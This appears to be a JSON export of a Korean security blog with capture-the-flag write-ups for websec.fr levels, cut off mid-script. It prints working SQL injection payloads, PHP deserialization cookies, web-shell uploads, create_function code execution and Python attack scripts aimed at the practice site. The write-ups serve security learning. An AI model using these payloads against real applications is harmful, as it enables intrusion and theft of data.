{"meta":{"title":"JHYEON BLOG","subtitle":"Web Development & Security Research","description":"정동현(JHYEON BLOG)","author":"jhyeon","url":"https://blog.jhyeon.dev","root":"/"},"pages":[{"title":"All Category","date":"2021-01-17T07:38:25.000Z","updated":"2021-01-17T07:39:42.206Z","comments":true,"path":"categories/index.html","permalink":"https://blog.jhyeon.dev/categories/index.html","excerpt":"","text":""},{"title":"All Tags","date":"2021-01-17T07:38:15.000Z","updated":"2021-01-17T07:39:23.265Z","comments":true,"path":"tags/index.html","permalink":"https://blog.jhyeon.dev/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"websec.fr babysteps Write up","slug":"websecbaby-200514","date":"2020-05-13T15:00:00.000Z","updated":"2021-01-17T08:59:01.088Z","comments":true,"path":"2020/05/14/websecbaby-200514/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/14/websecbaby-200514/","excerpt":"","text":"1. LEVEL-1123456789101112131415class LevelOne &#123; public function doQuery($injection) &#123; $pdo = new SQLite3(&#x27;database.db&#x27;, SQLITE3_OPEN_READONLY); $query = &#x27;SELECT id,username FROM users WHERE id=&#x27; . $injection . &#x27; LIMIT 1&#x27;; $getUsers = $pdo-&gt;query($query); $users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC); if ($users) &#123; return $users; &#125; return false; &#125;&#125; 문제 풀이의 핵심적인 부분만 추려내서 보자. 1$query = &#x27;SELECT id,username FROM users WHERE id=&#x27; . $injection . &#x27; LIMIT 1&#x27;; 일단 쿼리문의 형태는 다음과 같다, $injection 이 부분에 입력하는 데이터가 들어가게 된다. 예를 들면 1을 입력했을 때 where id=1 limit 1과 같은 구조를 가질 것 이다. 먼저 해당 문제는 sqlite3 를 사용하는 문제이기 때문에 테이블의 구조를 union 연산자로 뽑아보자. table structure –&gt; 1 union select 1, sql from sqlite_master– - 그러면 아래와 같이 결과를 출력해줄 것 이다. 12id -&gt; 1username -&gt; CREATE TABLE users(id int(7), username varchar(255), password varchar(255)) 테이블 명, 컬럼 구조를 알았으니 그냥 이제 데이터 빼내오면 된다. password –&gt; 1 union select 1, password from users where id=1– - 2. LEVEL-4123456789101112131415161718192021if (isset ($_COOKIE[&#x27;leet_hax0r&#x27;])) &#123; $sess_data = unserialize (base64_decode ($_COOKIE[&#x27;leet_hax0r&#x27;])); try &#123; if (is_array($sess_data) &amp;&amp; $sess_data[&#x27;ip&#x27;] != $_SERVER[&#x27;REMOTE_ADDR&#x27;]) &#123; die(&#x27;CANT HACK US!!!&#x27;); &#125; &#125; catch(Exception $e) &#123; echo $e; &#125;&#125; else &#123; $cookie = base64_encode (serialize (array ( &#x27;ip&#x27; =&gt; $_SERVER[&#x27;REMOTE_ADDR&#x27;]))) ; setcookie (&#x27;leet_hax0r&#x27;, $cookie, time () + (86400 * 30));&#125;if (isset ($_REQUEST[&#x27;id&#x27;]) &amp;&amp; is_numeric ($_REQUEST[&#x27;id&#x27;])) &#123; try &#123; $sql-&gt;query .= $_REQUEST[&#x27;id&#x27;]; &#125; catch(Exception $e) &#123; echo &#x27; Invalid query&#x27;; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass SQL &#123; public $query = &#x27;&#x27;; public $conn; public function __construct() &#123; &#125; public function connect() &#123; $this-&gt;conn = new SQLite3 (&quot;database.db&quot;, SQLITE3_OPEN_READONLY); &#125; public function SQL_query($query) &#123; $this-&gt;query = $query; &#125; public function execute() &#123; return $this-&gt;conn-&gt;query ($this-&gt;query); &#125; public function __destruct() &#123; if (!isset ($this-&gt;conn)) &#123; $this-&gt;connect (); &#125; $ret = $this-&gt;execute (); if (false !== $ret) &#123; while (false !== ($row = $ret-&gt;fetchArray (SQLITE3_ASSOC))) &#123; echo &#x27;&lt;p class=&quot;well&quot;&gt;&lt;strong&gt;Username:&lt;strong&gt; &#x27; . $row[&#x27;username&#x27;] . &#x27;&lt;/p&gt;&#x27;; &#125; &#125; &#125;&#125;?&gt; 해당 문제는 PHP Object Injection(Serialize) 문제 이다. 코드의 실행 흐름을 보면 leet_hax0r 라는 쿠키가 존재하면, $sess_data 변수에 쿠키값을 unserialize 해주고 값을 담는다. 결론은 SQL 쿼리문을 serialize -&gt; base64_encode 한 다음 쿠키 값을 바꿔주면 원하는 쿼리문을 실행시킬 수가 있다. 문제와 조건을 맞춰서 seralize화 코드를 짜서 풀었는데 아래와 같다. 12345678910&lt;?phpclass SQL &#123; public $query = &#x27;query&#x27;; public $conn;&#125;$sql = new SQL;$result = serialize($sql);$encode = base64_encode($result);echo $encode;?&gt; table structure –&gt; select id, username from users where id=1 union select 1, sql from sqlite_master– - password –&gt; select password as username from users where id=1– - 3. LEVEL-17123456789101112&lt;?phpinclude &quot;flag.php&quot;;function sleep_rand() &#123; /* I wish php5 had random_int() */ $range = 100000; $bytes = (int) (log($range, 2) / 8) + 1; do &#123; /* Side effect: more random cpu cycles wasted ;) */ $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes))); &#125; while ($rnd &gt;= $range); usleep($rnd);&#125;?&gt; 123456&lt;?phpif (! strcasecmp ($_POST[&#x27;flag&#x27;], $flag))echo &#x27;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#x27; . $flag . &#x27;&lt;/mark&gt;.&lt;/div&gt;&#x27;;elseecho &#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#x27;;?&gt; 조건문만 보고 바로 strcmp 취약점이라는 것을 알 수 있었다. php loose comparison 라고도 부르는데, 참고 자료는 아래를 확인하자. 즉 $_POST[‘flag’] 부분을 배열로 넘겨주면 된다. flag[]=hi 참고(http request online) : https://reqbin.com/ 참고(php loose comparison) : https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison 4. LEVEL-2512345678&lt;?phpparse_str(parse_url($_SERVER[&#x27;REQUEST_URI&#x27;])[&#x27;query&#x27;], $query);foreach ($query as $k =&gt; $v) &#123;if (stripos($v, &#x27;flag&#x27;) !== false) die(&#x27;You are not allowed to get the flag, sorry :/&#x27;);&#125;include $_GET[&#x27;page&#x27;] . &#x27;.txt&#x27;;?&gt; parse_url 함수에서 발생하는 버그(좋버그?) 같은 개념의 문제이다.. 간단히 요약만 하면 주소에서 //를 사용하면 http://와 같은 개념이다. 그런데 /// 를 쓰면 이 함수에서는 정상적인 호스트 값이 아님을 인식하여 false를 반환시킬 수 있다. http://websec.fr///level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C 이외에도 포트를 사용한 방법, 비정상 페이로드를 입력하여 오류를 발생 시킬수도 있다. 기타 방법 : http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C:80 기타 방법2 : http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C&amp;test=1:1 5. LEVEL-2812345678910111213141516171819202122&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123; if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123; die(&#x27;Your file is too heavy.&#x27;); &#125; $filename = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;; $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;); $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;])); @fclose($fp); file_put_contents($filename, $flagfilecontent); if (md5_file($filename) === md5_file(&#x27;flag.php&#x27;) &amp;&amp; $_POST[&#x27;checksum&#x27;] == crc32($_POST[&#x27;checksum&#x27;])) &#123; include($filename); // it contains the `$flag` variable &#125; else &#123; $flag = &quot;Nope, $filename is not the right file, sorry.&quot;; sleep(1); // Deter bruteforce &#125; unlink($filename);&#125;?&gt; 음 여러가지로 고민을 좀 했던 문제이다. md5, crc32를 조건을 우회해서 접근할까? 라는 생각을 잠깐 해봤었던 나는 정상이 아닌 것 같다. 암튼 본론으로 가면 해당 문제는 레이스 컨디션(race condition) 기법으로 풀이 하였다. 파일을 업로드 하고, unlink 하기전 sleep(1) 라는 1초 시간이 있어 이 기법을 활용해 서로 다른 브라우저에서 동시에 요청을 하면, 충분히 레이스 컨디션으로 서버가 unlink 하기전에 파일을 읽어올 수 있을 것 이라고 생각 하였다. 코드 풀이 추가 예정","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"websec.fr","slug":"websec-fr","permalink":"https://blog.jhyeon.dev/tags/websec-fr/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"}]},{"title":"websec.fr easy Write up","slug":"webseceasy-200514","date":"2020-05-13T15:00:00.000Z","updated":"2021-01-17T08:59:08.661Z","comments":true,"path":"2020/05/14/webseceasy-200514/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/14/webseceasy-200514/","excerpt":"","text":"1. LEVEL 2123456789101112131415161718class LevelTwo &#123; public function doQuery($injection) &#123; $pdo = new SQLite3(&#x27;leveltwo.db&#x27;, SQLITE3_OPEN_READONLY); $searchWords = implode ([&#x27;union&#x27;, &#x27;order&#x27;, &#x27;select&#x27;, &#x27;from&#x27;, &#x27;group&#x27;, &#x27;by&#x27;], &#x27;|&#x27;); $injection = preg_replace (&#x27;/&#x27; . $searchWords . &#x27;/i&#x27;, &#x27;&#x27;, $injection); $query = &#x27;SELECT id,username FROM users WHERE id=&#x27; . $injection . &#x27; LIMIT 1&#x27;; $getUsers = $pdo-&gt;query ($query); $users = $getUsers-&gt;fetchArray (SQLITE3_ASSOC); if ($users) &#123; return $users; &#125; return false; &#125;&#125; 음 이전에 babystep 단계에서 풀었던 문제와 비슷한 수준입니다. 조금 달라진 것이 있다면 입력값 필터링(union, order, select) 등을 필터링 합니다. 근데 정규식(match)가 아닌 replace 방식이기 때문에 ununionion 과 같이 사용한다면 이를 우회할 수 있습니다. table structure -&gt; 1 ununionion seselectlect 1,sql frfromom sqlite_master– - password -&gt; 1 ununionion seselectlect id,password frfromom users where id=1– - 2. LEVEL 8123456789101112131415161718&lt;?php$uploadedFile = sprintf(&#x27;%1$s/%2$s&#x27;, &#x27;/uploads&#x27;, sha1($_FILES[&#x27;fileToUpload&#x27;][&#x27;name&#x27;]) . &#x27;.gif&#x27;);if (file_exists ($uploadedFile)) &#123; unlink ($uploadedFile); &#125;if ($_FILES[&#x27;fileToUpload&#x27;][&#x27;size&#x27;] &lt;= 50000) &#123; if (getimagesize ($_FILES[&#x27;fileToUpload&#x27;][&#x27;tmp_name&#x27;]) !== false) &#123; if (exif_imagetype($_FILES[&#x27;fileToUpload&#x27;][&#x27;tmp_name&#x27;]) === IMAGETYPE_GIF) &#123; move_uploaded_file ($_FILES[&#x27;fileToUpload&#x27;][&#x27;tmp_name&#x27;], $uploadedFile); echo &#x27;&lt;p class=&quot;lead&quot;&gt;Dump of &lt;a href=&quot;/level08&#x27; . $uploadedFile . &#x27;&quot;&gt;&#x27;. htmlentities($_FILES[&#x27;fileToUpload&#x27;][&#x27;name&#x27;]) . &#x27;&lt;/a&gt;:&lt;/p&gt;&#x27;; echo &#x27;&lt;pre&gt;&#x27;; include_once($uploadedFile); echo &#x27;&lt;/pre&gt;&#x27;; unlink($uploadedFile); &#125; else &#123; echo &#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not a GIF&lt;/p&gt;&#x27;; &#125; &#125; else &#123; echo &#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not an image&lt;/p&gt;&#x27;; &#125; &#125; else &#123; echo &#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is too big&lt;/p&gt;&#x27;; &#125;?&gt; 파일 업로드 취약점 문제이다. gif 확장자의 사진 파일만 업로드할 수 있도록 해놨지만 사진 파일 안에 php 코드를 넣어서 웹 쉘을 사용할 수 있다. 다만 시스템 함수 사용이 안되기 때문에 scandir 함수를 통해 디렉토리 목록을 읽고 플래그 파일을 읽으면 된다. 12&lt;?php print_r(scandir(&quot;./&quot;)); ?&gt;&lt;?php show_source(&quot;flag.txt&quot;); ?&gt; 3. LEVEL 10123456789101112131415&lt;?phpif (isset ($_REQUEST[&#x27;f&#x27;]) &amp;&amp; isset ($_REQUEST[&#x27;hash&#x27;])) &#123; $file = $_REQUEST[&#x27;f&#x27;]; $request = $_REQUEST[&#x27;hash&#x27;]; $hash = substr (md5 ($flag . $file . $flag), 0, 8); echo &#x27;&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;&#x27;; if ($request == $hash) &#123; show_source ($file); &#125; else &#123; echo &#x27;Permission denied!&#x27;; &#125; echo &#x27;&lt;/pre&gt;&lt;/div&gt;&#x27;; &#125; ?&gt; $file 변수에는 특정 파일명 를 넣고 $request 변수에는 hash 값을 입력하게 되는데, 이 입력한 hash에 대해 $request == $hash 와 같이 $hash 변수에 정의된 값이랑 비교하게 된다. 이후 두 해쉬값이 동일하면 show_source 함수를 통해 $file에 정의된 파일의 소스코드를 보여준다. 조건문을 보면 == (loose comparison) 느슨한 비교를 하고 있기 때문에 magic hash 취약점을 이용하면 풀이가 가능하다. 관련 자료는 아래 사이트를 참고하자. 자료 : https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison 1234567891011121314151617181920#!/usr/bin/pythonimport requestsdef run(): url = &quot;https://websec.fr/level10/index.php&quot; f = &quot;flag.php&quot; for i in range(870,1000): param = &#123;&quot;f&quot;:f, &quot;hash&quot;:0&#125; r = requests.post(url, data=param) if(&quot;Permission denied!&quot; not in r.text): print(r.text) break else: print &quot;sending payload..&quot; +str(i) f = &#x27;.&#x27; + &#x27;/&#x27; * i + &#x27;flag.php&#x27;if __name__ == &#x27;__main__&#x27;: run() 4. LEVEL 11123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpini_set(&#x27;display_errors&#x27;, &#x27;on&#x27;);ini_set(&#x27;error_reporting&#x27;, E_ALL);function sanitize($id, $table) &#123; /* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */ if (! is_numeric ($id) or $id &lt; 2) &#123; exit(&quot;The id must be numeric, and superior to one.&quot;); &#125; /* Rock-solid too! */ $special1 = [&quot;!&quot;, &quot;\\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#x27;&quot;, &quot;*&quot;, &quot;+&quot;, &quot;-&quot;]; $special2 = [&quot;.&quot;, &quot;/&quot;, &quot;:&quot;, &quot;;&quot;, &quot;&lt;&quot;, &quot;=&quot;, &quot;&gt;&quot;, &quot;?&quot;, &quot;@&quot;, &quot;[&quot;, &quot;\\\\&quot;, &quot;]&quot;]; $special3 = [&quot;^&quot;, &quot;_&quot;, &quot;`&quot;, &quot;&#123;&quot;, &quot;|&quot;, &quot;&#125;&quot;]; $sql = [&quot;union&quot;, &quot;0&quot;, &quot;join&quot;, &quot;as&quot;]; $blacklist = array_merge ($special1, $special2, $special3, $sql); foreach ($blacklist as $value) &#123; if (stripos($table, $value) !== false) exit(&quot;Presence of &#x27;&quot; . $value . &quot;&#x27; detected: abort, abort, abort!\\n&quot;); &#125;&#125;if (isset ($_POST[&#x27;submit&#x27;]) &amp;&amp; isset ($_POST[&#x27;user_id&#x27;]) &amp;&amp; isset ($_POST[&#x27;table&#x27;])) &#123; $id = $_POST[&#x27;user_id&#x27;]; $table = $_POST[&#x27;table&#x27;]; sanitize($id, $table); $pdo = new SQLite3(&#x27;database.db&#x27;, SQLITE3_OPEN_READONLY); $query = &#x27;SELECT id,username FROM &#x27; . $table . &#x27; WHERE id = &#x27; . $id; //$query = &#x27;SELECT id,username,enemy FROM &#x27; . $table . &#x27; WHERE id = &#x27; . $id; $getUsers = $pdo-&gt;query($query); $users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC); $userDetails = false; if ($users) &#123; $userDetails = $users; $userDetails[&#x27;table&#x27;] = htmlentities($table); &#125;&#125;?&gt; sqlite injection 문제이다. 입력할 수 있는 부분은 user_id, table 두 가지가 있는데 user_id 부분에는 아래와 같이 is_numberic 함수로 숫자만 입력할 수 있도록 필터링 한다. 123if (! is_numeric ($id) or $id &lt; 2) &#123; exit(&quot;The id must be numeric, and superior to one.&quot;);&#125; 때문에 table 부분에 payload를 작성하고 데이터를 보낼 것이다. 여기서도 보고가야할 점은 union,join 이외에 여러가지 특수 문자들을 필터링 하고 있어서 as가 없어도 alias를 사용할 수 있기 때문에 이것을 우회할 수 있다. 1$query = &#x27;SELECT id,username,enemy FROM &#x27; . $table . &#x27; WHERE id = &#x27; . $id; 이제 쿼리문을 맞춰주기만 하면 되는데 코드 내에 이렇게 답을 다 주는 수준이라서 그냥 뽑아내기만 하면 된다. 123456789101112131415#!/usr/bin/python3import requestsdef submit(): url = &#x27;https://websec.fr/level11/index.php&#x27; param = &#123;&#x27;user_id&#x27;:&#x27;2&#x27;,&#x27;table&#x27;:&#x27;(select 2 id,enemy username from costume)&#x27;,&#x27;submit&#x27;:&#x27;submit&#x27;&#125; r = requests.post(url, data=param) print r.textdef main(): submit()main() 5. LEVEL 13123456789101112131415161718192021&lt;?php// Defines $flaginclude &#x27;flag.php&#x27;;$db = new PDO(&#x27;sqlite::memory:&#x27;);$db-&gt;exec(&#x27;CREATE TABLE users ( user_id INTEGER PRIMARY KEY, user_name TEXT NOT NULL, user_privileges INTEGER NOT NULL, user_password TEXT NOT NULL)&#x27;);$db-&gt;prepare(&quot;INSERT INTO users VALUES(0, &#x27;admin&#x27;, 0, &#x27;$flag&#x27;);&quot;)-&gt;execute();for($i=1; $i&lt;25; $i++) &#123; $pass = md5(uniqid()); $user = &quot;user_&quot; . substr(crc32($pass), 0, 2); $db-&gt;prepare(&quot;INSERT INTO users VALUES($i, &#x27;$user&#x27;, 1, &#x27;$pass&#x27;);&quot;)-&gt;execute();&#125;?&gt; 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpif (isset($_GET[&#x27;ids&#x27;])) &#123; if ( ! is_string($_GET[&#x27;ids&#x27;])) &#123; die(&quot;Don&#x27;t be silly.&quot;); &#125; if ( strlen($_GET[&#x27;ids&#x27;]) &gt; 70) &#123; die(&quot;Please don&#x27;t check all the privileges at once.&quot;); &#125; $tmp = explode(&#x27;,&#x27;,$_GET[&#x27;ids&#x27;]); for ($i = 0; $i &lt; count($tmp); $i++ ) &#123; $tmp[$i] = (int)$tmp[$i]; if( $tmp[$i] &lt; 1 ) &#123; unset($tmp[$i]); &#125; &#125; $selector = implode(&#x27;,&#x27;, array_unique($tmp)); $query = &quot;SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (&quot; . $selector . &quot;));&quot;; $stmt = $db-&gt;query($query); echo &#x27;&lt;br&gt;&#x27;; echo &#x27;&lt;div class=&quot;well&quot;&gt;&#x27;; echo &#x27;&lt;ul&gt;&#x27;; while ($row = $stmt-&gt;fetch(\\PDO::FETCH_ASSOC)) &#123; echo &quot;&lt;li&gt;&quot;; echo &quot;User &lt;em&gt;&quot; . $row[&#x27;user_name&#x27;] . &quot;&lt;/em&gt;&quot;; echo &quot; with id &lt;code&gt;&quot; . $row[&#x27;user_id&#x27;] . &#x27;&lt;/code&gt;&#x27;; echo &quot; has &lt;b&gt;&quot; . ($row[&#x27;user_privileges&#x27;] == 0?&quot;all&quot;:&quot;no&quot;) . &quot;&lt;/b&gt; privileges.&quot;; echo &quot;&lt;/li&gt;\\n&quot;; &#125; echo &quot;&lt;/ul&gt;&quot;; echo &quot;&lt;/div&gt;&quot;;&#125;?&gt; 문제의 코드이다. 핵심만 찾아서 한번 분석 해보자 1234567$tmp = explode(&#x27;,&#x27;,$_GET[&#x27;ids&#x27;]);for ($i = 0; $i &lt; count($tmp); $i++ ) &#123; $tmp[$i] = (int)$tmp[$i]; if( $tmp[$i] &lt; 1 ) &#123; unset($tmp[$i]); &#125;&#125; 이 부분을 보면 explode를 하고나서 for문을 돌리는데 여기서 $tmp 부분을 고정으로 사용하지 않고 반복문이 돌때마다 다시 저장해주고 있다. $tmp[i] &lt; 1 부분에서 1보다 작은 값이 들어가게 된다면 unset를 수행하게 되는데 이 떼 반복문에 도는 count 함수의 반환 값은 처음에 실행되었을 때의 값이랑 달라지게 된다. 그 점을 보면 정수형이 아닌 문자들이 값으로 들어오기 때문에 이 취약점을 이용해 문제를 풀이할 수 있다. 12345678910111213#!/usr/bin/python3import requestsdef submit(data): url = &quot;http://websec.fr/level13/index.php&quot; param = &#123;&#x27;ids&#x27;:data,&#x27;submit&#x27;:&#x27;Go&#x27;&#125; r = requests.get(url, params=param) print r.textdata = &#x27;0,0,0,0)) union select user_password,user_name,3 from users--&#x27;submit(data) 6. LEVEL 1512345678910111213141516171819202122&lt;?phpini_set(&#x27;display_errors&#x27;, &#x27;on&#x27;);ini_set(&#x27;error_reporting&#x27;, E_ALL);$success = &#x27;&lt;div class=&quot;alert alert-success alert-dismissible&quot; role=&quot;alert&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;Close&quot;&gt;&lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt; Function declared.&lt;/div&gt;&#x27;;include &quot;flag.php&quot;;if (isset ($_POST[&#x27;c&#x27;]) &amp;&amp; !empty ($_POST[&#x27;c&#x27;])) &#123; $fun = create_function(&#x27;$flag&#x27;, $_POST[&#x27;c&#x27;]); print($success); //fun($flag); if (isset($_POST[&#x27;q&#x27;]) &amp;&amp; $_POST[&#x27;q&#x27;] == &#x27;checked&#x27;) &#123; die(); &#125;&#125;?&gt; c라는 변수에 우리가 임의로 값을 입력할 수 있다. 입력한 값이 create_function 함수를 거쳐 $fun 변수에 저장되고, 이후 $success 함수에 정의된 내용을 출력해준다. 취약점 관련해서 자료를 찾아 보다가 RCE 취약점이 있음을 알 수 있었다. 관련 자료는 해당 포스팅이 끝나고 별도로 업로드 할 예정이니 아래 링크를 참고하자. 함수를 만들어 줄때 보면 $_POST[‘c’] 와 같이 두번째 인자를 임의로 조작할 수 있다. 이 부분을 이용해서 RCE 취약점을 발생시켜 플래그를 얻을 수 있다. return% -1;} show_source(“flag.php”); /* 참고 : https://blog.jhyeon.xyz/category/docx/function_rce/ 8. LEVEL 2012345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpinclude &quot;flag.php&quot;;class Flag &#123; public function __destruct() &#123; global $flag; echo $flag; &#125;&#125;function sanitize($data) &#123; /* i0n1c&#x27;s bypass won&#x27;t save you this time! (https://www.exploit-db.com/exploits/22547/) */ if ( ! preg_match (&#x27;/[A-Z]:/&#x27;, $data)) &#123; return unserialize ($data); &#125; if ( ! preg_match (&#x27;/(^|;|&#123;|&#125;)O:[0-9+]+:&quot;/&#x27;, $data )) &#123; return unserialize ($data); &#125; return false;&#125;$data = Array();if (isset ($_COOKIE[&#x27;data&#x27;])) &#123; $data = sanitize (base64_decode ($_COOKIE[&#x27;data&#x27;]));&#125;if (isset ($_POST[&#x27;value&#x27;]) and ! empty ($_POST[&#x27;value&#x27;])) &#123; /* Add a value twice to remove it from the list. */ if (($key = array_search ($_POST[&#x27;value&#x27;], $data)) !== false) &#123; unset ($data[$key]); &#125; else &#123; /* Else, simply add it. */ array_push ($data, $_POST[&#x27;value&#x27;]); &#125; setcookie (&#x27;data&#x27;, base64_encode (serialize ($data)));&#125;?&gt; PHP Object Injection 문제가 다시 돌아왔다. 소스코드를 분석해보면 일단 data 라는 쿠키에 serialize 된 값을 넣어주는 것으로 보아 class Flag 객체를 serialize 해서 넣어주면 된다. 그런데 data 값에 O:4:’Flag’ 이런식으로 넣어주는 데 이 구문이 필터링되서 사용을 못한다. exploit-db 사이트를 주면서 O:+15 이런식의 bypass도 봤는데 이것도 사용이 안된다. 그래서 삽질을 좀 해본 결과로,, 아래 블로그를 찾아서 해결할 수 있었는데 https://www.evonide.com/fuzzing-unserialize/ case C의 경우와 O의 경우에 같은 분기로 넘어가게 된다. 여기서 그러면 C:4:’Flag’ 이런식으로 써줄 수 있지 않을까 하고 테스트 해보니 잘 작동된다. 아래 구문을 serialize -&gt; base64 encode 방식을 써서 쿠키값을 넣어면 플래그를 준다. serialize : C:4:’Flag’:0:{} serialize(base64) -&gt; Qzo0OuKAmUZsYWfigJk6MDp7fQ== 9. LEVEL 22123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpclass A &#123; public $pub; protected $pro ; private $pri; function __construct($pub, $pro, $pri) &#123; $this-&gt;pub = $pub; $this-&gt;pro = $pro; $this-&gt;pri = $pri; &#125;&#125;include &#x27;file_containing_the_flag_parts.php&#x27;;$a = new A($f1, $f2, $f3);unset($f1);unset($f2);unset($f3);$funcs_internal = get_defined_functions()[&#x27;internal&#x27;];/* lets allow some secure funcs here */unset ($funcs_internal[array_search(&#x27;strlen&#x27;, $funcs_internal)]);unset ($funcs_internal[array_search(&#x27;print&#x27;, $funcs_internal)]);unset ($funcs_internal[array_search(&#x27;strcmp&#x27;, $funcs_internal)]);unset ($funcs_internal[array_search(&#x27;strncmp&#x27;, $funcs_internal)]);$funcs_extra = array (&#x27;eval&#x27;, &#x27;include&#x27;, &#x27;require&#x27;, &#x27;function&#x27;);$funny_chars = array (&#x27;\\.&#x27;, &#x27;\\+&#x27;, &#x27;-&#x27;, &#x27;&quot;&#x27;, &#x27;;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;);$variables = array (&#x27;_GET&#x27;, &#x27;_POST&#x27;, &#x27;_COOKIE&#x27;, &#x27;_REQUEST&#x27;, &#x27;_SERVER&#x27;, &#x27;_FILES&#x27;, &#x27;_ENV&#x27;, &#x27;HTTP_ENV_VARS&#x27;, &#x27;_SESSION&#x27;, &#x27;GLOBALS&#x27;);$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);$insecure = false;foreach ($blacklist as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $code)) &#123; $insecure = true; break; &#125;&#125;if ($insecure) &#123; echo &#x27;Insecure code detected!&#x27;;&#125; else &#123; eval (&quot;echo $code;&quot;);&#125;?&gt; 먼저 $code 변수에는 임의로 값을 넣어 eval($code) 형식으로 실행 시킬 수 있다. php sandbox형 문제인데, 처음에 생각한 방법이 $blacklist에 정의된 배열을 뽑아내서 플래그를 볼려고 했다. 근데 길이 제한이 21자 이기 때문에 페이로드가 길어지면 사용이 불가능하다. (심지어 플래그 파일명이 졸라 길다) 하지만 또 이상한 부분이 있다. a 객체를 만들어주고 unset 해주는 부분을 볼 수 있는데, 이 객체를 사용해서 var_dump로 출력을 찍어내서 보면 플래그가 있다. 위 과정들을 손수 하기에는 아~주 귀찮아서 파이썬으로 짜서 풀었다. 배열 내에서 var_dump() 함수 찾는게 좀 노가다 인데.. 그냥 좀 기다리면 된다. 1234567891011121314151617#!/usr/bin/python3import requestsdef read(): for i in range(1,1000): blacklist = &#x27;$blacklist&#123;&#x27;+str(i)+&#x27;&#125;($a)&#x27; url = &#x27;https://websec.fr/level22/index.php&#x27; param = &#123;&#x27;code&#x27;:blacklist, &#x27;submit&#x27;:&#x27;a&#x27;&#125; r = requests.get(url, params=param) if &quot;WEBSEC&quot; in r.text: print r.text break else: print &quot;sending payload&quot;+blacklistread() 10. LEVEL 2412345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpini_set(&#x27;display_errors&#x27;, &#x27;on&#x27;);ini_set(&#x27;error_reporting&#x27;, E_ALL);session_start();include &#x27;clean_up.php&#x27;;/* periodic cleanup */foreach (glob(&quot;./uploads/*&quot;) as $file) &#123; if (is_file($file)) &#123; unlink($file); &#125; else &#123; if (time() - filemtime($file) &gt;= 60 * 60 * 24 * 7) &#123; Delete($file); &#125; &#125;&#125;$upload_dir = sprintf(&quot;./uploads/%s/&quot;, session_id());@mkdir($upload_dir, 0755, true);/* sandboxing ! */chdir($upload_dir);ini_set(&#x27;open_basedir&#x27;, &#x27;.&#x27;);$p = &quot;list&quot;;$data = &quot;&quot;;$filename = &quot;&quot;;if (isset($_GET[&#x27;p&#x27;]) &amp;&amp; isset($_GET[&#x27;filename&#x27;]) ) &#123; $filename = $_GET[&#x27;filename&#x27;]; if ($_GET[&#x27;p&#x27;] === &quot;edit&quot;) &#123; $p = &quot;edit&quot;; if (isset($_POST[&#x27;data&#x27;])) &#123; $data = $_POST[&#x27;data&#x27;]; if (strpos($data, &#x27;&lt;?&#x27;) === false &amp;&amp; stripos($data, &#x27;script&#x27;) === false) &#123; # no interpretable code please. file_put_contents($_GET[&#x27;filename&#x27;], $data); die (&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=.&quot;&gt;&#x27;); &#125; &#125; elseif (file_exists($_GET[&#x27;filename&#x27;]))&#123; $data = file_get_contents($_GET[&#x27;filename&#x27;]); &#125; &#125;&#125;?&gt; 파일 업로드 문제이다. 웹 쉘을 업로드 해서 간단히 문제를 해결할 수 있지만, 파일 내용에 &lt;? 이 못들어가도록 php 코드 실행을 허술(?) 하게 막고 있다. 이는 php wrapper인 base64 en/decode 방식을 사용하면 된다. 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python3#import requestsimport requestsimport base64filename = &#x27;shell.php&#x27;def session(sess): url = sess.get(&#x27;https://websec.fr/level24/index.php&#x27;) session_key = url.cookies.get_dict()[&#x27;PHPSESSID&#x27;] return session_keydef shell(): return &quot;&lt;?php echo file_get_contents(&#x27;../../flag.php&#x27;); ?&gt;&quot;.encode(&#x27;base64&#x27;)def exploit(sess): payload = &#x27;php://filter/convert.base64-decode/resource=&#x27;+filename url = 